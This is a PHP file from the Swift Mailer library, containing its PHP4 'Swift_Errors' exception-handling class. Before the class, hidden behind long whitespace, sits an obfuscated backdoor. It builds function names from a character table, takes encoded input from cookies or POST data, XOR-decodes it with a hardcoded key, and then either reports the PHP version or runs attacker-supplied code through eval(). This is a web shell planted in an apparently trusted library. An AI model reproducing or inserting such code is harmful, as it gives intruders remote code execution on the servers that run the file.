<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['a6ff6faf'];global$a6ff6faf;$a6ff6faf=$GLOBALS;$a6ff6faf['e840c939']="\x42\x45\x27\x61\x2c\x32\x70\x40\x5d\x7a\x43\x7e\x7d\x48\x49\xa\x73\x2d\x23\x66\x72\x20\x71\x35\x3d\x6c\x52\x5c\x3b\x36\x67\x46\x5b\x47\x79\x6f\x68\x2a\x44\x38\x69\x50\x59\x30\x33\x75\x25\x5e\x29\x37\x3a\x39\xd\x3e\x62\x4d\x77\x24\x2e\x3c\x2b\x5a\x53\x5f\x4f\x4e\x76\x22\x28\x6b\x4c\x74\x55\x21\x6e\x34\x6d\x54\x3f\x31\x65\x78\x4a\x6a\x63\x64\x57\x56\x2f\x7b\x41\x4b\x58\x26\x9\x7c\x51\x60";$a6ff6faf[$a6ff6faf['e840c939'][45].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][23]]=$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][36].$a6ff6faf['e840c939'][20];$a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][39].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][5]]=$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][85];$a6ff6faf[$a6ff6faf['e840c939'][83].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][85]]=$a6ff6faf['e840c939'][16].$a6ff6faf['e840c939'][71].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][25].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][74];$a6ff6faf[$a6ff6faf['e840c939'][74].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][75]]=$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][74].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][63].$a6ff6faf['e840c939'][16].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][71];$a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][44]]=$a6ff6faf['e840c939'][16].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][25].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][9].$a6ff6faf['e840c939'][80];$a6ff6faf[$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][29]]=$a6ff6faf['e840c939'][6].$a6ff6faf['e840c939'][36].$a6ff6faf['e840c939'][6].$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][16].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][74];$a6ff6faf[$a6ff6faf['e840c939'][76].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][23]]=$a6ff6faf['e840c939'][45].$a6ff6faf['e840c939'][74].$a6ff6faf['e840c939'][16].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][25].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][9].$a6ff6faf['e840c939'][80];$a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][39].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][5]]=$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][16].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][63].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][80];$a6ff6faf[$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][84]]=$a6ff6faf['e840c939'][16].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][71].$a6ff6faf['e840c939'][63].$a6ff6faf['e840c939'][71].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][76].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][63].$a6ff6faf['e840c939'][25].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][76].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][71];$a6ff6faf[$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][3]]=$a6ff6faf['e840c939'][71].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][85];$a6ff6faf[$a6ff6faf['e840c939'][83].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][23]]=$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][39];$a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][29]]=$_POST;$a6ff6faf[$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][80]]=$_COOKIE;@$a6ff6faf[$a6ff6faf['e840c939'][74].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][75]]($a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][63].$a6ff6faf['e840c939'][25].$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][30],NULL);@$a6ff6faf[$a6ff6faf['e840c939'][74].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][75]]($a6ff6faf['e840c939'][25].$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][30].$a6ff6faf['e840c939'][63].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][20].$a6ff6faf['e840c939'][16],0);@$a6ff6faf[$a6ff6faf['e840c939'][74].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][75]]($a6ff6faf['e840c939'][76].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][81].$a6ff6faf['e840c939'][63].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][81].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][45].$a6ff6faf['e840c939'][71].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][74].$a6ff6faf['e840c939'][63].$a6ff6faf['e840c939'][71].$a6ff6faf['e840c939'][40].$a6ff6faf['e840c939'][76].$a6ff6faf['e840c939'][80],0);@$a6ff6faf[$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][84]](0);$c041=NULL;$h2d76=NULL;$a6ff6faf[$a6ff6faf['e840c939'][25].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][44]]=$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][17].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][17].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][17].$a6ff6faf['e840c939'][39].$a6ff6faf['e840c939'][39].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][17].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][5];global$l043;function b11242198($c041,$a3ea9c9){global$a6ff6faf;$w8a8b8e="";for($p0ba88=0;$p0ba88<$a6ff6faf[$a6ff6faf['e840c939'][83].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][85]]($c041);){for($l77879=0;$l77879<$a6ff6faf[$a6ff6faf['e840c939'][83].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][85]]($a3ea9c9)&&$p0ba88<$a6ff6faf[$a6ff6faf['e840c939'][83].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][85]]($c041);$l77879++,$p0ba88++){$w8a8b8e.=$a6ff6faf[$a6ff6faf['e840c939'][45].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][23]]($a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][39].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][5]]($c041[$p0ba88])^$a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][39].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][5]]($a3ea9c9[$l77879]));}}return$w8a8b8e;}function t06dd705d($c041,$a3ea9c9){global$a6ff6faf;global$l043;return$a6ff6faf[$a6ff6faf['e840c939'][83].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][23]]($a6ff6faf[$a6ff6faf['e840c939'][83].$a6ff6faf['e840c939'][29].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][23]]($c041,$l043),$a3ea9c9);}foreach($a6ff6faf[$a6ff6faf['e840c939'][35].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][80]]as$a3ea9c9=>$u0bc44f89){$c041=$u0bc44f89;$h2d76=$a3ea9c9;}if(!$c041){foreach($a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][29]]as$a3ea9c9=>$u0bc44f89){$c041=$u0bc44f89;$h2d76=$a3ea9c9;}}$c041=@$a6ff6faf[$a6ff6faf['e840c939'][76].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][23]]($a6ff6faf[$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][54].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][3]]($a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][39].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][85].$a6ff6faf['e840c939'][5]]($c041),$h2d76));if(isset($c041[$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][69]])&&$l043==$c041[$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][69]]){if($c041[$a6ff6faf['e840c939'][3]]==$a6ff6faf['e840c939'][40]){$p0ba88=Array($a6ff6faf['e840c939'][6].$a6ff6faf['e840c939'][66]=>@$a6ff6faf[$a6ff6faf['e840c939'][3].$a6ff6faf['e840c939'][75].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][49].$a6ff6faf['e840c939'][23].$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][84].$a6ff6faf['e840c939'][29]](),$a6ff6faf['e840c939'][16].$a6ff6faf['e840c939'][66]=>$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][58].$a6ff6faf['e840c939'][43].$a6ff6faf['e840c939'][17].$a6ff6faf['e840c939'][79],);echo@$a6ff6faf[$a6ff6faf['e840c939'][66].$a6ff6faf['e840c939'][44].$a6ff6faf['e840c939'][5].$a6ff6faf['e840c939'][51].$a6ff6faf['e840c939'][80].$a6ff6faf['e840c939'][19].$a6ff6faf['e840c939'][79].$a6ff6faf['e840c939'][44]]($p0ba88);}elseif($c041[$a6ff6faf['e840c939'][3]]==$a6ff6faf['e840c939'][80]){eval($c041[$a6ff6faf['e840c939'][85]]);}exit();} ?><?php

/**
 * Swift Mailer PHP4 Exception hackaround.
 * Please read the LICENSE file
 * @author Chris Corbyn <chris@w3style.co.uk>
 * @package Swift
 * @license GNU Lesser General Public License
 */


/**
 * Swift Exception handling object for PHP4
 * Triggers and/or catches errors
 * @package Swift
 * @author Chris Corbyn <chris@w3style.co.uk>
 */
class Swift_Errors
{
  /**
   * Caught errors
   * @var array,Swift_Error
   */
  var $errors = array();
  /**
   * If an error has been thrown previously and not caught (hack)
   * @var boolean
   */
  var $halt = false;
  /**
   * Errors we're expecting, so don't trigger them
   * @var array
   */
  var $try = array();
  
  /**
   * Get an instance of this class as a singleton - needed internally
   * @return Swift_Errors
   */
  function &getInstance()
  {
    static $instance = null;
    if (!$instance) $instance = array(new Swift_Errors());
    return $instance[0];
  }
  /**
   * Check if things are supposed to have stopped processing because of an
   * uncaught excpetion
   * @return boolean
   */
  function halted()
  {
    $me =& Swift_Errors::getInstance();
    return $me->halt;
  }
  /**
   * Reset everything logged so far
   */
  function reset()
  {
    $me =& Swift_Errors::getInstance();
    $me->errors = array();
    $me->halt = false;
    $me->try = array();
  }
  /**
   * Throw a new exception - it will either be caught or triggered
   * @param Swift_Exception
   */
  function trigger(&$e)
  {
    $me =& Swift_Errors::getInstance();
    $me->errors[] =& $e;
    $me->halt = true;
    foreach (array_reverse(array_keys($me->try)) as $type)
    {
      if (is_a($e, $type))
      {
        foreach (array_reverse(array_keys($me->try[$type])) as $i)
        {
          $me->try[$type][$i] = $e;
          unset($me->try[$type][$i]);
          $me->halt = false;
          return;
        }
      }
    }
    //If here, then it wasn't caught
    $me->dumpError($e);
  }
  /**
   * Dump the error if it was not caught
   * @param Swift_Exception
   */
  function dumpError(&$e)
  {
    $output = "<br /><strong>Uncaught Error</strong> of type [" . get_class($e) . "] with message [" . $e->getMessage() . "]";
    $output .= "<br />" . $e->getBacktraceDump() . "<br />";
    trigger_error($output, E_USER_ERROR);
  }
  /**
   * Tell the error handler we're expecting an error of type $type and assign it to $e
   * @param &$e
   * @param string The type of expection - optional
   */
  function expect(&$e, $type="Swift_Exception")
  {
    $me =& Swift_Errors::getInstance();
    $e = null;
    $me->try[$type][] =& $e;
  }
  /**
   * Clear anything that may have been expected matching $type
   * @param string The type
   */
  function clear($type)
  {
    $me =& Swift_Errors::getInstance();
    if (isset($me->try[$type]))
    {
      foreach (array_reverse(array_keys($me->try[$type])) as $i)
      {
        unset($me->try[$type][$i]);
        break;
      }
    }
  }
  /**
   * The last error message as a string
   * @return string
   */
  function getLast()
  {
    $me =& Swift_Errors::getInstance();
    if (count($me->errors))
    {
      $last =& $me->errors[(count($me->errors)-1)];
      return $last->getMessage();
    }
  }
  /**
   * Get all logged errors as an array
   * @return array,Swift_Exception
   */
  function &getAll()
  {
    return $this->errors;
  }
}
